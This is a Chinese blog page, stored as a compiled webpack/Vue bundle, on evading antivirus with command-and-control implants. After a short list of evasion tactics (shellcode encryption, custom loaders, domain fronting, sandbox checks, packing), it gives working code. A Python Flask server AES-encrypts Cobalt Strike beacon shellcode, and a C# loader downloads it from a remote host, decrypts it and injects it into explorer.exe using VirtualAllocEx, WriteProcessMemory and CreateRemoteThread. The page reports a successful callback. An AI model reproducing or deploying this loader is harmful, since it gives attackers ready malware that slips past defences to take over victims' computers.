(window.webpackJsonp=window.webpackJsonp||[]).push([[25],{751:function(s,n,t){"use strict";t.r(n);var a=t(103),e=Object(a.a)({},(function(){var s=this,n=s.$createElement,t=s._self._c||n;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"c-c免杀对抗多维度分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#c-c免杀对抗多维度分析"}},[s._v("#")]),s._v(" C&C免杀对抗多维度分析")]),s._v(" "),t("p",[t("strong",[s._v("查杀方式")])]),s._v(" "),t("blockquote",[t("p",[s._v("文件查杀（Signatured Static Scanning）\n内存扫描（Run-time Analysis）\n流量分析（NIPS/NIDS）\n行为分析（behavior Monitoring）")])]),s._v(" "),t("p",[t("strong",[s._v("对抗-静态扫描（文件查杀）")])]),s._v(" "),t("p",[s._v("1、shellcode加密（XOR、AES）")]),s._v(" "),t("p",[s._v("避免被杀软直接获取到真正shellcode（因为性能等原因 杀软不会暴力枚举解密内容）")]),s._v(" "),t("p",[s._v("2、源码级免杀（自主研发C&C工具）")]),s._v(" "),t("p",[t("strong",[s._v("对抗-内存扫描")])]),s._v(" "),t("p",[s._v("各种语言自定义加载器，比如使用C# 编写ShellCode Loader")]),s._v(" "),t("p",[s._v("运行机制不同（C#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器")]),s._v(" "),t("p",[t("strong",[s._v("对抗-流量分析")])]),s._v(" "),t("p",[s._v("域前置 - Domain Fronting")]),s._v(" "),t("p",[s._v("流量路径"),t("code",[s._v("CDN->IP->c2")])]),s._v(" "),t("p",[t("strong",[s._v("对抗-行为分析")])]),s._v(" "),t("p",[s._v("指定特定的运行条件，符合条件才执行恶意操作；避免在沙箱、逆向分析时有明显的恶意行为。")]),s._v(" "),t("p",[s._v("适合指定某个重要目标的情况下使用，比如要拿域内的某台重要靶标。")]),s._v(" "),t("p",[s._v("或者可以加强壳，例如VMP")]),s._v(" "),t("h1",{attrs:{id:"一、shellcode加密"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#一、shellcode加密"}},[s._v("#")]),s._v(" 一、shellcode加密")]),s._v(" "),t("p",[s._v("推荐一个脚本：https://github.com/rvrsh3ll/CPLResourceRunner")]),s._v(" "),t("p",[s._v("可以把CS生成的RAW的beacon.bin转成shellcode")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("python2 ConvertShellcode.py beacon.bin\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("服务端：Python Flask动态加密Shellcode")])]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#服务端起个Flask动态加密，__init__.py")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#coding=utf-8")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" base64\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" Crypto"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Cipher "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" AES\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" Crypto"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Util"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Padding "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" pad"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" unpad\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" flask "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" Flask\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add_to_32")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("32")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        key "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\0'")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("encode"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 返回bytes,密钥不是32位就不全")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("create_app")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# create and configure the app")]),s._v("\n    app "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Flask"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("__name__"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" instance_relative_config"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token decorator annotation punctuation"}},[s._v("@app"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("route")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/<string:key>'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" methods"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'GET'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'POST'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("AES_Encrypt")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        BLOCK_SIZE "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("32")]),s._v("  "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Bytes")]),s._v("\n        f "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./shellcode.txt'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'r'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#从CS导出的C#格式的shellcode，放在Fask应用根目录")]),s._v("\n        shellcode "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" f"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("read"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        cipher "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" AES"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("new"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("add_to_32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("key"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" AES"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("MODE_ECB"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        encrypted "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" cipher"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("encrypt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pad"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("shellcode"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("encode"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'utf-8'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("BLOCK_SIZE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        encrypted_text "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("base64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("encodebytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("encrypted"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" encoding"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'utf-8'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#加密结果用base64编码")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" encrypted_text\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" app\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br")])]),t("h1",{attrs:{id:"二、c-编写loader"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#二、c-编写loader"}},[s._v("#")]),s._v(" 二、C#编写Loader")]),s._v(" "),t("p",[t("strong",[s._v("客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -> 解密 -> 创建进程 运行上线")])]),s._v(" "),t("div",{staticClass:"language-c# line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('//WLoader C#\nusing System;\nusing System.Security.Cryptography;\nusing System.IO;\nusing System.Net;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Diagnostics;\n\nnamespace Wloader\n{\n    class Program\n    {\n        // Used to Load Shellcode into Memory:\n        private static UInt32 MEM_COMMIT = 0x1000;\n        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n        [DllImport("kernel32.dll")] //声明API函数\n        public static extern int VirtualAllocEx(\n            IntPtr hProcess, //进程的句柄.该函数在此进程的虚拟地址空间内分配内存\n            int lpAddress,//该指针为要分配的页面区域指定所需的起始地址\n            UInt32 dwSize,//要分配的内存区域的大小，以字节为单位\n            UInt32 flAllocationType,//内存分配的类型 ,MEM_COMMIT为指定的保留内存页面分配内存\n            UInt32 flProtect);//对要分配的页面区域的内存保护,PAGE_EXECUTE_READWRITE\n        //该地址必须是页面属性为PAGE_EXECUTE_READWRITE的页面）或者其他宿主进程能执行地方（如共享内存映射区）\n\n        [DllImport("kernel32.dll")]\n        public static extern int WriteProcessMemory(\n            IntPtr hProcess,    //要修改的过程存储器的句柄\n            int lpBaseAddress, //指向要写入数据的指定进程中的基地址的指针\n            byte[] lpBuffer, //指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据\n            int nSize,//要写入指定进程的字节数 \n            int lpNumberOfBytesWritten);//指向变量的指针，该变量接收传输到指定进程中的字节数;(可选)为NULL则忽略\n\n        [DllImport("kernel32.dll")]\n        public static extern int GetProcAddress(int hwnd, string lpname);\n\n        [DllImport("kernel32.dll")]\n        public static extern int GetModuleHandleA(string name);\n\n        [DllImport("kernel32.dll")]\n        private static extern IntPtr CreateRemoteThread(\n            IntPtr hProcess,//目标进程的句柄\n            UInt32 lpThreadAttributes, //指向线程的安全描述结构体的指针，一般设置为NULL，表示默认安全级别\n            UInt32 dwStackSize,//线程堆栈大小，一般设置为0，表示使用默认大小\n            UInt32 lpStartAddress,//线程函数的地址\n            IntPtr lpParameter,//线程参数\n            UInt32 dwCreationFlags,//线程的创建方式，CREATE_SUSPENDED 线程以挂起方式创建\n            ref UInt32 lpThreadId); //输出参数，记录创建的远程线程的ID\n        \n\n        [DllImport("kernel32")]\n        private static extern UInt32 WaitForSingleObject(\n          IntPtr hHandle,\n          UInt32 dwMilliseconds\n        );\n\n        public static string key;\n\n\n\n        //随机生成32位密钥\n        public static void NewKey()\n        {\n            key = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 32);\n        }\n        //请求获取shellcode内容\n        public static string GetShell(string url)\n        {\n            url = url + key;\n            HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口\n            reqContent.Method = "GET";\n            reqContent.AllowAutoRedirect = true;//服务端重定向。一般设置false\n            reqContent.Timeout = 5000;\n            HttpWebResponse respContent = (HttpWebResponse)reqContent.GetResponse();\n            StreamReader sr = new StreamReader(respContent.GetResponseStream());\n            return sr.ReadToEnd();\n\n        }\n\n        //AES解密\n        public static string AesDecrypt(string message, string key)\n        {\n            using (AesCryptoServiceProvider aesProvider = new AesCryptoServiceProvider())\n            {\n                aesProvider.Key = Encoding.UTF8.GetBytes(key);\n                aesProvider.Mode = CipherMode.ECB;\n                aesProvider.Padding = PaddingMode.None;\n                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())\n                {\n                    byte[] inputBuffers = Convert.FromBase64String(message);\n                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);\n                    aesProvider.Clear();\n                    string rs = Encoding.UTF8.GetString(results);\n                    rs = rs.Replace("", null);\n                    rs = rs.Replace("", null);\n                    rs = rs.Replace(" ", null);\n                    return rs;\n                }\n            }\n        }\n       \n    public static void runShell(string shellcodes)\n        {\n            string[] strings = shellcodes.Split(\',\');\n            byte[] shellcode = new byte[strings.Length];\n            //逐个字符变为16进制字节数据\n            for (int i = 0; i < strings.Length; i++)\n            {\n                shellcode[i] = Convert.ToByte(strings[i], 16);\n            }\n            Console.WriteLine(strings.Length);\n            try\n            {\n\n                Process[] pname = Process.GetProcesses(); //取得所有进程\n                foreach (Process name in pname)\n                {\n                    if (name.ProcessName.ToLower().IndexOf("explorer") != -1)//注入到资源管理器中\n                    {\n                        IntPtr hThread = IntPtr.Zero;\n                        UInt32 threadId = 0;\n                        IntPtr pinfo = IntPtr.Zero;\n\n                        UInt32 funcAddr = (uint)VirtualAllocEx(name.Handle, 0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n                        //在宿主进程中申请一块存储区域\n\n                        WriteProcessMemory(name.Handle, (int)funcAddr, shellcode, shellcode.Length, 0);\n                        //通过WriteProcessMemory函数将线程代码写入宿主进程中（替换上边的）\n\n                        /*threadId = GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");*/\n                        //取得loadlibrary在kernek32.dll地址\n\n                        hThread = CreateRemoteThread(name.Handle, 0, 0, funcAddr, pinfo, 0, ref threadId);\n                        WaitForSingleObject(hThread, 0xFFFFFFFF);\n                        Console.WriteLine("执行完毕，Success");\n                    }\n                }\n            }\n            catch (Exception e)\n            {\n                Console.Error.WriteLine("exception: " + e.Message);\n            }\n        }\n        static void Main(string[] args)\n        {\n            NewKey();//生成32位的密钥key\n            string shellcode = GetShell("http://192.168.1.103:5000/");//从HTTP服务器获取加密的Shellcode\n            shellcode = AesDecrypt(shellcode, key);//这里就得到了动态加解密后的shellcode\n            //Console.WriteLine(shellcode);//输出测试\n\n            //接下来注入到进程\n            runShell(shellcode);\n        }\n    }\n}\n\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br"),t("span",{staticClass:"line-number"},[s._v("46")]),t("br"),t("span",{staticClass:"line-number"},[s._v("47")]),t("br"),t("span",{staticClass:"line-number"},[s._v("48")]),t("br"),t("span",{staticClass:"line-number"},[s._v("49")]),t("br"),t("span",{staticClass:"line-number"},[s._v("50")]),t("br"),t("span",{staticClass:"line-number"},[s._v("51")]),t("br"),t("span",{staticClass:"line-number"},[s._v("52")]),t("br"),t("span",{staticClass:"line-number"},[s._v("53")]),t("br"),t("span",{staticClass:"line-number"},[s._v("54")]),t("br"),t("span",{staticClass:"line-number"},[s._v("55")]),t("br"),t("span",{staticClass:"line-number"},[s._v("56")]),t("br"),t("span",{staticClass:"line-number"},[s._v("57")]),t("br"),t("span",{staticClass:"line-number"},[s._v("58")]),t("br"),t("span",{staticClass:"line-number"},[s._v("59")]),t("br"),t("span",{staticClass:"line-number"},[s._v("60")]),t("br"),t("span",{staticClass:"line-number"},[s._v("61")]),t("br"),t("span",{staticClass:"line-number"},[s._v("62")]),t("br"),t("span",{staticClass:"line-number"},[s._v("63")]),t("br"),t("span",{staticClass:"line-number"},[s._v("64")]),t("br"),t("span",{staticClass:"line-number"},[s._v("65")]),t("br"),t("span",{staticClass:"line-number"},[s._v("66")]),t("br"),t("span",{staticClass:"line-number"},[s._v("67")]),t("br"),t("span",{staticClass:"line-number"},[s._v("68")]),t("br"),t("span",{staticClass:"line-number"},[s._v("69")]),t("br"),t("span",{staticClass:"line-number"},[s._v("70")]),t("br"),t("span",{staticClass:"line-number"},[s._v("71")]),t("br"),t("span",{staticClass:"line-number"},[s._v("72")]),t("br"),t("span",{staticClass:"line-number"},[s._v("73")]),t("br"),t("span",{staticClass:"line-number"},[s._v("74")]),t("br"),t("span",{staticClass:"line-number"},[s._v("75")]),t("br"),t("span",{staticClass:"line-number"},[s._v("76")]),t("br"),t("span",{staticClass:"line-number"},[s._v("77")]),t("br"),t("span",{staticClass:"line-number"},[s._v("78")]),t("br"),t("span",{staticClass:"line-number"},[s._v("79")]),t("br"),t("span",{staticClass:"line-number"},[s._v("80")]),t("br"),t("span",{staticClass:"line-number"},[s._v("81")]),t("br"),t("span",{staticClass:"line-number"},[s._v("82")]),t("br"),t("span",{staticClass:"line-number"},[s._v("83")]),t("br"),t("span",{staticClass:"line-number"},[s._v("84")]),t("br"),t("span",{staticClass:"line-number"},[s._v("85")]),t("br"),t("span",{staticClass:"line-number"},[s._v("86")]),t("br"),t("span",{staticClass:"line-number"},[s._v("87")]),t("br"),t("span",{staticClass:"line-number"},[s._v("88")]),t("br"),t("span",{staticClass:"line-number"},[s._v("89")]),t("br"),t("span",{staticClass:"line-number"},[s._v("90")]),t("br"),t("span",{staticClass:"line-number"},[s._v("91")]),t("br"),t("span",{staticClass:"line-number"},[s._v("92")]),t("br"),t("span",{staticClass:"line-number"},[s._v("93")]),t("br"),t("span",{staticClass:"line-number"},[s._v("94")]),t("br"),t("span",{staticClass:"line-number"},[s._v("95")]),t("br"),t("span",{staticClass:"line-number"},[s._v("96")]),t("br"),t("span",{staticClass:"line-number"},[s._v("97")]),t("br"),t("span",{staticClass:"line-number"},[s._v("98")]),t("br"),t("span",{staticClass:"line-number"},[s._v("99")]),t("br"),t("span",{staticClass:"line-number"},[s._v("100")]),t("br"),t("span",{staticClass:"line-number"},[s._v("101")]),t("br"),t("span",{staticClass:"line-number"},[s._v("102")]),t("br"),t("span",{staticClass:"line-number"},[s._v("103")]),t("br"),t("span",{staticClass:"line-number"},[s._v("104")]),t("br"),t("span",{staticClass:"line-number"},[s._v("105")]),t("br"),t("span",{staticClass:"line-number"},[s._v("106")]),t("br"),t("span",{staticClass:"line-number"},[s._v("107")]),t("br"),t("span",{staticClass:"line-number"},[s._v("108")]),t("br"),t("span",{staticClass:"line-number"},[s._v("109")]),t("br"),t("span",{staticClass:"line-number"},[s._v("110")]),t("br"),t("span",{staticClass:"line-number"},[s._v("111")]),t("br"),t("span",{staticClass:"line-number"},[s._v("112")]),t("br"),t("span",{staticClass:"line-number"},[s._v("113")]),t("br"),t("span",{staticClass:"line-number"},[s._v("114")]),t("br"),t("span",{staticClass:"line-number"},[s._v("115")]),t("br"),t("span",{staticClass:"line-number"},[s._v("116")]),t("br"),t("span",{staticClass:"line-number"},[s._v("117")]),t("br"),t("span",{staticClass:"line-number"},[s._v("118")]),t("br"),t("span",{staticClass:"line-number"},[s._v("119")]),t("br"),t("span",{staticClass:"line-number"},[s._v("120")]),t("br"),t("span",{staticClass:"line-number"},[s._v("121")]),t("br"),t("span",{staticClass:"line-number"},[s._v("122")]),t("br"),t("span",{staticClass:"line-number"},[s._v("123")]),t("br"),t("span",{staticClass:"line-number"},[s._v("124")]),t("br"),t("span",{staticClass:"line-number"},[s._v("125")]),t("br"),t("span",{staticClass:"line-number"},[s._v("126")]),t("br"),t("span",{staticClass:"line-number"},[s._v("127")]),t("br"),t("span",{staticClass:"line-number"},[s._v("128")]),t("br"),t("span",{staticClass:"line-number"},[s._v("129")]),t("br"),t("span",{staticClass:"line-number"},[s._v("130")]),t("br"),t("span",{staticClass:"line-number"},[s._v("131")]),t("br"),t("span",{staticClass:"line-number"},[s._v("132")]),t("br"),t("span",{staticClass:"line-number"},[s._v("133")]),t("br"),t("span",{staticClass:"line-number"},[s._v("134")]),t("br"),t("span",{staticClass:"line-number"},[s._v("135")]),t("br"),t("span",{staticClass:"line-number"},[s._v("136")]),t("br"),t("span",{staticClass:"line-number"},[s._v("137")]),t("br"),t("span",{staticClass:"line-number"},[s._v("138")]),t("br"),t("span",{staticClass:"line-number"},[s._v("139")]),t("br"),t("span",{staticClass:"line-number"},[s._v("140")]),t("br"),t("span",{staticClass:"line-number"},[s._v("141")]),t("br"),t("span",{staticClass:"line-number"},[s._v("142")]),t("br"),t("span",{staticClass:"line-number"},[s._v("143")]),t("br"),t("span",{staticClass:"line-number"},[s._v("144")]),t("br"),t("span",{staticClass:"line-number"},[s._v("145")]),t("br"),t("span",{staticClass:"line-number"},[s._v("146")]),t("br"),t("span",{staticClass:"line-number"},[s._v("147")]),t("br"),t("span",{staticClass:"line-number"},[s._v("148")]),t("br"),t("span",{staticClass:"line-number"},[s._v("149")]),t("br"),t("span",{staticClass:"line-number"},[s._v("150")]),t("br"),t("span",{staticClass:"line-number"},[s._v("151")]),t("br"),t("span",{staticClass:"line-number"},[s._v("152")]),t("br"),t("span",{staticClass:"line-number"},[s._v("153")]),t("br"),t("span",{staticClass:"line-number"},[s._v("154")]),t("br"),t("span",{staticClass:"line-number"},[s._v("155")]),t("br"),t("span",{staticClass:"line-number"},[s._v("156")]),t("br"),t("span",{staticClass:"line-number"},[s._v("157")]),t("br"),t("span",{staticClass:"line-number"},[s._v("158")]),t("br"),t("span",{staticClass:"line-number"},[s._v("159")]),t("br")])]),t("p",[t("strong",[s._v("成功上线")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ss.png",alt:""}})]),s._v(" "),t("p",[t("strong",[s._v("杀软扫描")])]),s._v(" 